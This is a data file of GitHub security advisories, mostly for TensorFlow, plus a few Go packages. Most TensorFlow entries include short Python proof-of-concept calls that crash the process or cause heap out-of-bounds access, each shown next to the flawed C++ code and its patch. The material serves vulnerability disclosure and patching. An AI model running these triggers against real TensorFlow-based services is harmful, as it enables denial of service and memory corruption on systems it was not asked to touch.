This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
230,20741,tensorflow,GHSA-hmg3-c7xj-6qwm,CVE-2021-29545,https://github.com/advisories/GHSA-hmg3-c7xj-6qwm,low,2021-05-21 14:23:25 UTC,Heap buffer overflow in `SparseTensorToCSRSparseMatrix`,"### Impact
An attacker can trigger a denial of service via a `CHECK`-fail in converting sparse tensors to CSR Sparse matrices:

```python
import tensorflow as tf
import numpy as np
from tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops

indices_array = np.array([[0, 0]])
value_array = np.array([0.0], dtype=np.float32)
dense_shape = [0, 0]

st = tf.SparseTensor(indices_array, value_array, dense_shape)

values_tensor = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(
       st.indices, st.values, st.dense_shape)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/800346f2c03a27e182dd4fba48295f65e7790739/tensorflow/core/kernels/sparse/kernels.cc#L66) does a double redirection to access an element of an array allocated on the heap:

```cc
csr_row_ptr(indices(i, 0) + 1) += 1;
```
                      
If the value at `indices(i, 0)` is such that `indices(i, 0) + 1` is outside the bounds of `csr_row_ptr`, this results in writing outside of bounds of heap allocated data.

### Patches
We have patched the issue in GitHub commit [1e922ccdf6bf46a3a52641f99fd47d54c1decd13](https://github.com/tensorflow/tensorflow/commit/1e922ccdf6bf46a3a52641f99fd47d54c1decd13).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
231,20741,tensorflow,GHSA-m34j-p8rj-wjxq,CVE-2021-29546,https://github.com/advisories/GHSA-m34j-p8rj-wjxq,low,2021-05-21 14:23:28 UTC,Division by 0 in `QuantizedBiasAdd`,"### Impact
An attacker can trigger an integer division by zero undefined behavior in `tf.raw_ops.QuantizedBiasAdd`:

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)
bias = tf.constant([], shape=[0], dtype=tf.quint8)
min_input = tf.constant(-10.0, dtype=tf.float32)
max_input = tf.constant(-10.0, dtype=tf.float32)
min_bias = tf.constant(-10.0, dtype=tf.float32)
max_bias = tf.constant(-10.0, dtype=tf.float32)

tf.raw_ops.QuantizedBiasAdd(input=input_tensor, bias=bias, min_input=min_input,
                            max_input=max_input, min_bias=min_bias,
                            max_bias=max_bias, out_type=tf.qint32)
```

This is because the [implementation of the Eigen kernel](https://github.com/tensorflow/tensorflow/blob/61bca8bd5ba8a68b2d97435ddfafcdf2b85672cd/tensorflow/core/kernels/quantization_utils.h#L812-L849) does a division by the number of elements of the smaller input (based on shape) without checking that this is not zero:

```cc
template <typename T1, typename T2, typename T3>
void QuantizedAddUsingEigen(const Eigen::ThreadPoolDevice& device,
                            const Tensor& input, float input_min,
                            float input_max, const Tensor& smaller_input,
                            float smaller_input_min, float smaller_input_max,
                            Tensor* output, float* output_min,
                            float* output_max) {
  ...
  const int64 input_element_count = input.NumElements();
  const int64 smaller_input_element_count = smaller_input.NumElements();
  ...
  bcast[0] = input_element_count / smaller_input_element_count;
  ...
}
```

This integral division by 0 is undefined behavior.

### Patches
We have patched the issue in GitHub commit [67784700869470d65d5f2ef20aeb5e97c31673cb](https://github.com/tensorflow/tensorflow/commit/67784700869470d65d5f2ef20aeb5e97c31673cb).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
232,20741,tensorflow,GHSA-4fg4-p75j-w5xj,CVE-2021-29547,https://github.com/advisories/GHSA-4fg4-p75j-w5xj,low,2021-05-21 14:23:31 UTC,Heap out of bounds in `QuantizedBatchNormWithGlobalNormalization`,"### Impact
An attacker can cause a segfault and denial of service via accessing data outside of bounds in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:

```python
import tensorflow as tf

t = tf.constant([1], shape=[1, 1, 1, 1], dtype=tf.quint8)
t_min = tf.constant([], shape=[0], dtype=tf.float32)
t_max = tf.constant([], shape=[0], dtype=tf.float32)
m = tf.constant([1], shape=[1], dtype=tf.quint8)
m_min = tf.constant([], shape=[0], dtype=tf.float32)
m_max = tf.constant([], shape=[0], dtype=tf.float32)
v = tf.constant([1], shape=[1], dtype=tf.quint8)
v_min = tf.constant([], shape=[0], dtype=tf.float32)
v_max = tf.constant([], shape=[0], dtype=tf.float32)
beta = tf.constant([1], shape=[1], dtype=tf.quint8)
beta_min = tf.constant([], shape=[0], dtype=tf.float32)
beta_max = tf.constant([], shape=[0], dtype=tf.float32)
gamma = tf.constant([1], shape=[1], dtype=tf.quint8)
gamma_min = tf.constant([], shape=[0], dtype=tf.float32)
gamma_max = tf.constant([], shape=[0], dtype=tf.float32) 

tf.raw_ops.QuantizedBatchNormWithGlobalNormalization(
  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,
  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,
  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,
  gamma_max=gamma_max, out_type=tf.qint32,
  variance_epsilon=0.1, scale_after_normalization=True)
```                         
                            
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f/tensorflow/core/kernels/quantized_batch_norm_op.cc#L176-L189) assumes the inputs are not empty: 
  
```cc
const float input_min = context->input(1).flat<float>()(0);
const float input_max = context->input(2).flat<float>()(0);
...
const float mean_min = context->input(4).flat<float>()(0);
const float mean_max = context->input(5).flat<float>()(0);
...
const float var_min = context->input(7).flat<float>()(0);
const float var_max = context->input(8).flat<float>()(0);
...
const float beta_min = context->input(10).flat<float>()(0);
const float beta_max = context->input(11).flat<float>()(0);
...
const float gamma_min = context->input(13).flat<float>()(0);
const float gamma_max = context->input(14).flat<float>()(0);
```

If any of these inputs is empty, `.flat<T>()` is an empty buffer, so accessing the element at index 0 is accessing data outside of bounds.

### Patches
We have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
233,20741,tensorflow,GHSA-p45v-v4pw-77jr,CVE-2021-29548,https://github.com/advisories/GHSA-p45v-v4pw-77jr,low,2021-05-21 14:23:34 UTC,Division by 0 in `QuantizedBatchNormWithGlobalNormalization`,"### Impact
An attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:

```python
import tensorflow as tf

t = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)
t_min = tf.constant(-10.0, dtype=tf.float32)
t_max = tf.constant(-10.0, dtype=tf.float32)
m = tf.constant([], shape=[0], dtype=tf.quint8)
m_min = tf.constant(-10.0, dtype=tf.float32)
m_max = tf.constant(-10.0, dtype=tf.float32)
v = tf.constant([], shape=[0], dtype=tf.quint8)
v_min = tf.constant(-10.0, dtype=tf.float32)
v_max = tf.constant(-10.0, dtype=tf.float32)
beta = tf.constant([], shape=[0], dtype=tf.quint8)
beta_min = tf.constant(-10.0, dtype=tf.float32)
beta_max = tf.constant(-10.0, dtype=tf.float32)
gamma = tf.constant([], shape=[0], dtype=tf.quint8)
gamma_min = tf.constant(-10.0, dtype=tf.float32)
gamma_max = tf.constant(-10.0, dtype=tf.float32)

tf.raw_ops.QuantizedBatchNormWithGlobalNormalization(
  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,
  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,
  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,
  gamma_max=gamma_max, out_type=tf.qint32,
  variance_epsilon=0.1, scale_after_normalization=True)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f/tensorflow/core/kernels/quantized_batch_norm_op.cc) does not validate all constraints specified in the [op's contract](https://www.tensorflow.org/api_docs/python/tf/raw_ops/QuantizedBatchNormWithGlobalNormalization).

### Patches 
We have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team",pip
234,20741,tensorflow,GHSA-x83m-p7pv-ch8v,CVE-2021-29549,https://github.com/advisories/GHSA-x83m-p7pv-ch8v,low,2021-05-21 14:23:38 UTC,Division by 0 in `QuantizedAdd`,"### Impact
An attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.QuantizedAdd`:

```python
import tensorflow as tf

x = tf.constant([68, 228], shape=[2, 1], dtype=tf.quint8)
y = tf.constant([], shape=[2, 0], dtype=tf.quint8)

min_x = tf.constant(10.723421015884028)
max_x = tf.constant(15.19578006631113)
min_y = tf.constant(-5.539003866682977)
max_y = tf.constant(42.18819949559947)

tf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/6f26b3f3418201479c264f2a02000880d8df151c/tensorflow/core/kernels/quantized_add_op.cc#L289-L295) computes a modulo operation without validating that the divisor is not zero.

```cc
void VectorTensorAddition(const T* vector_data, float min_vector,
                          float max_vector, int64 vector_num_elements,
                          const T* tensor_data, float min_tensor,
                          float max_tensor, int64 tensor_num_elements,
                          float output_min, float output_max, Toutput* output) {
  for (int i = 0; i < tensor_num_elements; ++i) {
    const int64 vector_i = i % vector_num_elements;
    ...
  }
}
```

Since `vector_num_elements` is [determined based on input shapes](https://github.com/tensorflow/tensorflow/blob/6f26b3f3418201479c264f2a02000880d8df151c/tensorflow/core/kernels/quantized_add_op.cc#L522-L544), a user can trigger scenarios where this quantity is 0.

### Patches
We have patched the issue in GitHub commit [744009c9e5cc5d0447f0dc39d055f917e1fd9e16](https://github.com/tensorflow/tensorflow/commit/744009c9e5cc5d0447f0dc39d055f917e1fd9e16).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
235,20741,tensorflow,GHSA-f78g-q7r4-9wcv,CVE-2021-29550,https://github.com/advisories/GHSA-f78g-q7r4-9wcv,low,2021-05-21 14:23:41 UTC,Division by 0 in `FractionalAvgPool`,"### Impact
An attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.FractionalAvgPool`:

```python
import tensorflow as tf

value = tf.constant([60], shape=[1, 1, 1, 1], dtype=tf.int32)
pooling_ratio = [1.0, 1.0000014345305555, 1.0, 1.0]
pseudo_random = False
overlapping = False
deterministic = False
seed = 0
seed2 = 0

tf.raw_ops.FractionalAvgPool(
  value=value, pooling_ratio=pooling_ratio, pseudo_random=pseudo_random,
  overlapping=overlapping, deterministic=deterministic, seed=seed, seed2=seed2)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_avg_pool_op.cc#L85-L89) computes a divisor quantity by dividing two user controlled values:

```cc                     
for (int i = 0; i < tensor_in_and_out_dims; ++i) {
  output_size[i] = static_cast<int>(std::floor(input_size[i] / pooling_ratio_[i]));
  DCHECK_GT(output_size[i], 0); 
} 
``` 
    
The user controls the values of `input_size[i]` and `pooling_ratio_[i]` (via the `value.shape()` and `pooling_ratio` arguments). If the value in `input_size[i]` is smaller than the `pooling_ratio_[i]`, then the floor operation results in `output_size[i]` being 0. The `DCHECK_GT` line is a no-op outside of debug mode, so in released versions of TF this does not trigger.

Later, these computed values [are used as arguments](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_avg_pool_op.cc#L96-L99) to [`GeneratePoolingSequence`](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_pool_common.cc#L100-L108). There, the first computation is a division in a modulo operation:

```cc
std::vector<int64> GeneratePoolingSequence(int input_length, int output_length,
                                           GuardedPhiloxRandom* generator,
                                           bool pseudo_random) {
  ...
  if (input_length % output_length == 0) {
    diff = std::vector<int64>(output_length, input_length / output_length);
  }
  ...
}
```

Since `output_length` can be 0, this results in runtime crashing.

### Patches
We have patched the issue in GitHub commit [548b5eaf23685d86f722233d8fbc21d0a4aecb96](https://github.com/tensorflow/tensorflow/commit/548b5eaf23685d86f722233d8fbc21d0a4aecb96).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
236,20741,tensorflow,GHSA-vqw6-72r7-fgw7,CVE-2021-29551,https://github.com/advisories/GHSA-vqw6-72r7-fgw7,low,2021-05-21 14:23:44 UTC,OOB read in `MatrixTriangularSolve`,"### Impact
The implementation of [`MatrixTriangularSolve`](https://github.com/tensorflow/tensorflow/blob/8cae746d8449c7dda5298327353d68613f16e798/tensorflow/core/kernels/linalg/matrix_triangular_solve_op_impl.h#L160-L240) fails to terminate kernel execution if one validation condition fails:

```cc
void ValidateInputTensors(OpKernelContext* ctx, const Tensor& in0,
                            const Tensor& in1) override {
  OP_REQUIRES(
      ctx, in0.dims() >= 2,
      errors::InvalidArgument(""In[0] ndims must be >= 2: "", in0.dims()));

  OP_REQUIRES(
      ctx, in1.dims() >= 2,
      errors::InvalidArgument(""In[0] ndims must be >= 2: "", in1.dims()));
}
  
void Compute(OpKernelContext* ctx) override {
  const Tensor& in0 = ctx->input(0);
  const Tensor& in1 = ctx->input(1);

  ValidateInputTensors(ctx, in0, in1);

  MatMulBCast bcast(in0.shape().dim_sizes(), in1.shape().dim_sizes());
  ...
}
```
  
Since `OP_REQUIRES` only sets `ctx->status()` to a non-OK value and calls `return`, this allows malicious attackers to trigger an out of bounds read:

```python
import tensorflow as tf
import numpy as np

matrix_array = np.array([])
matrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(1,0)),dtype=tf.float32)
rhs_array = np.array([])
rhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(0,1)),dtype=tf.float32)

tf.raw_ops.MatrixTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor,lower=False,adjoint=False)
```

As the two input tensors are empty, the `OP_REQUIRES` in `ValidateInputTensors` should fire and interrupt execution. However, given the implementation of `OP_REQUIRES`, after the `in0.dims() >= 2` fails, execution moves to the initialization of the `bcast` object. This initialization is done with invalid data and results in heap OOB read.

### Patches
We have patched the issue in GitHub commit [480641e3599775a8895254ffbc0fc45621334f68](https://github.com/tensorflow/tensorflow/commit/480641e3599775a8895254ffbc0fc45621334f68).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.",pip
237,20741,tensorflow,GHSA-jhq9-wm9m-cf89,CVE-2021-29552,https://github.com/advisories/GHSA-jhq9-wm9m-cf89,low,2021-05-21 14:23:48 UTC,CHECK-failure in `UnsortedSegmentJoin`,"### Impact
An attacker can cause a denial of service by controlling the values of `num_segments` tensor argument for `UnsortedSegmentJoin`:

```python
import tensorflow as tf

inputs = tf.constant([], dtype=tf.string)
segment_ids = tf.constant([], dtype=tf.int32)
num_segments = tf.constant([], dtype=tf.int32)
separator = ''

tf.raw_ops.UnsortedSegmentJoin(
  inputs=inputs, segment_ids=segment_ids,
  num_segments=num_segments, separator=separator)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a2a607db15c7cd01d754d37e5448d72a13491bdb/tensorflow/core/kernels/unsorted_segment_join_op.cc#L92-L93) assumes that the `num_segments` tensor is a valid scalar:

```cc
const Tensor& num_segments_tensor = context->input(2);
auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();
```

Since the tensor is empty the `CHECK` involved in `.scalar<T>()()` that checks that the number of elements is exactly 1 will be invalidated and this would result in process termination.

### Patches
We have patched the issue in GitHub commit [704866eabe03a9aeda044ec91a8d0c83fc1ebdbe](https://github.com/tensorflow/tensorflow/commit/704866eabe03a9aeda044ec91a8d0c83fc1ebdbe).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
238,22922,bluemonday,GHSA-3x58-xr87-2fcj,CVE-2021-29272,https://github.com/advisories/GHSA-3x58-xr87-2fcj,moderate,2021-05-18 21:07:37 UTC,Cross-site scripting in bluemonday,"bluemonday before 1.0.5 allows XSS because certain Go lowercasing converts an uppercase Cyrillic character, defeating a protection mechanism against the ""script"" string.",go
239,22840,gjson,GHSA-wjm3-fq3r-5x46,CVE-2020-36066,https://github.com/advisories/GHSA-wjm3-fq3r-5x46,moderate,2021-05-18 21:07:54 UTC,Denial of service,GJSON <1.6.5 allows attackers to cause a denial of service (remote) via crafted JSON.,go
240,20741,tensorflow,GHSA-h9px-9vqg-222h,CVE-2021-29553,https://github.com/advisories/GHSA-h9px-9vqg-222h,low,2021-05-21 14:23:51 UTC,Heap OOB in `QuantizeAndDequantizeV3`,"### Impact
An attacker can read data outside of bounds of heap allocated buffer in `tf.raw_ops.QuantizeAndDequantizeV3`:

```python
import tensorflow as tf

tf.raw_ops.QuantizeAndDequantizeV3(
  input=[2.5,2.5], input_min=[0,0], input_max=[1,1], num_bits=[30],
  signed_input=False, range_given=False, narrow_range=False, axis=3)
```   

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/11ff7f80667e6490d7b5174aa6bf5e01886e770f/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L237) does not validate the value of user supplied `axis` attribute before using it to index in the array backing the `input` argument:

```cc
const int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);
```

### Patches
We have patched the issue in GitHub commit [99085e8ff02c3763a0ec2263e44daec416f6a387](https://github.com/tensorflow/tensorflow/commit/99085e8ff02c3763a0ec2263e44daec416f6a387).
  
The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Aivul Team from Qihoo 360.",pip
241,20741,tensorflow,GHSA-qg48-85hg-mqc5,CVE-2021-29554,https://github.com/advisories/GHSA-qg48-85hg-mqc5,low,2021-05-21 14:23:55 UTC,Division by 0 in `DenseCountSparseOutput`,"### Impact
An attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.DenseCountSparseOutput`:

```python
import tensorflow as tf

values = tf.constant([], shape=[0, 0], dtype=tf.int64)
weights = tf.constant([])

tf.raw_ops.DenseCountSparseOutput(
  values=values, weights=weights,
  minlength=-1, maxlength=58, binary_output=True)
```
  
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/efff014f3b2d8ef6141da30c806faf141297eca1/tensorflow/core/kernels/count_ops.cc#L123-L127) computes a divisor value from user data but does not check that the result is 0 before doing the division:

```cc
int num_batch_elements = 1;
for (int i = 0; i < num_batch_dimensions; ++i) {
  num_batch_elements *= data.shape().dim_size(i);
}
int num_value_elements = data.shape().num_elements() / num_batch_elements;
```

Since `data` is given by the `values` argument, `num_batch_elements` is 0.

### Patches
We have patched the issue in GitHub commit [da5ff2daf618591f64b2b62d9d9803951b945e9f](https://github.com/tensorflow/tensorflow/commit/da5ff2daf618591f64b2b62d9d9803951b945e9f).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, and TensorFlow 2.3.3, as these are also affected.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
242,22072,websocket,GHSA-3xh2-74w9-5vxm,CVE-2020-27813,https://github.com/advisories/GHSA-3xh2-74w9-5vxm,high,2021-05-18 21:08:02 UTC,Integer overflow in github.com/gorilla/websocket,An integer overflow vulnerability exists with the length of websocket frames received via a websocket connection. An attacker would use this flaw to cause a denial of service attack on an HTTP Server allowing websocket connections.,go
243,22111,jwt-go,GHSA-w73w-5m7g-f7qc,CVE-2020-26160,https://github.com/advisories/GHSA-w73w-5m7g-f7qc,high,2021-05-18 21:08:21 UTC,Authorization bypass in github.com/dgrijalva/jwt-go,"jwt-go allows attackers to bypass intended access restrictions in situations with []string{} for m[""aud""] (which is allowed by the specification). Because the type assertion fails, """" is the value of aud. This is a security problem if the JWT token is presented to a service that lacks its own audience check. There is no patch available and users of jwt-go are advised to migrate to [golang-jwt](https://github.com/golang-jwt/jwt) at version 3.2.1",go
244,20741,tensorflow,GHSA-r35g-4525-29fq,CVE-2021-29555,https://github.com/advisories/GHSA-r35g-4525-29fq,low,2021-05-21 14:23:58 UTC,Division by 0 in `FusedBatchNorm`,"### Impact
An attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.FusedBatchNorm`:

```python
import tensorflow as tf

x = tf.constant([], shape=[1, 1, 1, 0], dtype=tf.float32)
scale = tf.constant([], shape=[0], dtype=tf.float32)
offset = tf.constant([], shape=[0], dtype=tf.float32)
mean = tf.constant([], shape=[0], dtype=tf.float32)
variance = tf.constant([], shape=[0], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = ""NHWC""
is_training = False

tf.raw_ops.FusedBatchNorm(
    x=x, scale=scale, offset=offset, mean=mean,
    variance=variance, epsilon=epsilon,
    exponential_avg_factor=exponential_avg_factor,
    data_format=data_format, is_training=is_training)
``` 
  
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/828f346274841fa7505f7020e88ca36c22e557ab/tensorflow/core/kernels/fused_batch_norm_op.cc#L295-L297) performs a division based on the last dimension of the `x` tensor:

```cc 
const int depth = x.dimension(3);
const int rest_size = size / depth;
```

Since this is controlled by the user, an attacker can trigger a denial of service.

### Patches
We have patched the issue in GitHub commit [1a2a87229d1d61e23a39373777c056161eb4084d](https://github.com/tensorflow/tensorflow/commit/1a2a87229d1d61e23a39373777c056161eb4084d).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
245,33709,u-root,GHSA-58pf-pcwv-qg85,CVE-2020-7665,https://github.com/advisories/GHSA-58pf-pcwv-qg85,moderate,2021-05-18 21:08:28 UTC,Path traversal,This affects all versions of package github.com/u-root/u-root/pkg/uzip. It is vulnerable to both leading and non-leading relative path traversal attacks in zip file extraction.,go
246,23209,macaron.v1,GHSA-733f-44f3-3frw,CVE-2020-12666,https://github.com/advisories/GHSA-733f-44f3-3frw,moderate,2021-05-18 21:08:35 UTC,Open redirect,"macaron before 1.3.7 has an open redirect in the static handler, as demonstrated by the http://127.0.0.1:4000//example.com/ URL.",go
247,20741,tensorflow,GHSA-fxqh-cfjm-fp93,CVE-2021-29556,https://github.com/advisories/GHSA-fxqh-cfjm-fp93,low,2021-05-21 14:24:39 UTC,Division by 0 in `Reverse`,"### Impact
An attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.Reverse`:

```python
import tensorflow as tf

tensor_input = tf.constant([], shape=[0, 1, 1], dtype=tf.int32)
dims = tf.constant([False, True, False], shape=[3], dtype=tf.bool)

tf.raw_ops.Reverse(tensor=tensor_input, dims=dims)
``` 
    
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/36229ea9e9451dac14a8b1f4711c435a1d84a594/tensorflow/core/kernels/reverse_op.cc#L75-L76) performs a division based on the first dimension of the tensor argument:
    
```cc
const int64 N = input.dim_size(0);
const int64 cost_per_unit = input.NumElements() / N;
```

Since this is controlled by the user, an attacker can trigger a denial of service.

### Patches
We have patched the issue in GitHub commit [4071d8e2f6c45c1955a811fee757ca2adbe462c1](https://github.com/tensorflow/tensorflow/commit/4071d8e2f6c45c1955a811fee757ca2adbe462c1).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
248,22171,dns,GHSA-44r7-7p62-q3fr,CVE-2019-19794,https://github.com/advisories/GHSA-44r7-7p62-q3fr,moderate,2021-05-18 21:09:13 UTC,Insecure generation of random numbers,"The miekg Go DNS package before 1.1.25, as used in CoreDNS before 1.6.6 and other products, improperly generates random numbers because math/rand is used. The TXID becomes predictable, leading to response forgeries.",go
249,20741,tensorflow,GHSA-xw93-v57j-fcgh,CVE-2021-29557,https://github.com/advisories/GHSA-xw93-v57j-fcgh,low,2021-05-21 14:24:48 UTC,Division by 0 in `SparseMatMul`,"### Impact
An attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.SparseMatMul`:

```python
import tensorflow as tf

a = tf.constant([100.0, 100.0, 100.0, 100.0], shape=[2, 2], dtype=tf.float32)
b = tf.constant([], shape=[0, 2], dtype=tf.float32)

tf.raw_ops.SparseMatMul(
    a=a, b=b, transpose_a=True, transpose_b=True,
    a_is_sparse=True, b_is_sparse=True)
``` 
    
The division by 0 occurs deep in Eigen code because the `b` tensor is empty.
    
### Patches
We have patched the issue in GitHub commit [7f283ff806b2031f407db64c4d3edcda8fb9f9f5](https://github.com/tensorflow/tensorflow/commit/7f283ff806b2031f407db64c4d3edcda8fb9f9f5).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
250,20741,tensorflow,GHSA-mqh2-9wrp-vx84,CVE-2021-29558,https://github.com/advisories/GHSA-mqh2-9wrp-vx84,low,2021-05-21 14:24:51 UTC,Heap buffer overflow in `SparseSplit`,"### Impact
An attacker can cause a heap buffer overflow in `tf.raw_ops.SparseSplit`:

```python
import tensorflow as tf

shape_dims = tf.constant(0, dtype=tf.int64)
indices = tf.ones([1, 1], dtype=tf.int64)
values = tf.ones([1], dtype=tf.int64)
shape = tf.ones([1], dtype=tf.int64)

tf.raw_ops.SparseSplit(
    split_dim=shape_dims, indices=indices, values=values,
    shape=shape, num_split=1)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/699bff5d961f0abfde8fa3f876e6d241681fbef8/tensorflow/core/util/sparse/sparse_tensor.h#L528-L530) accesses an array element based on a user controlled offset:

```cc
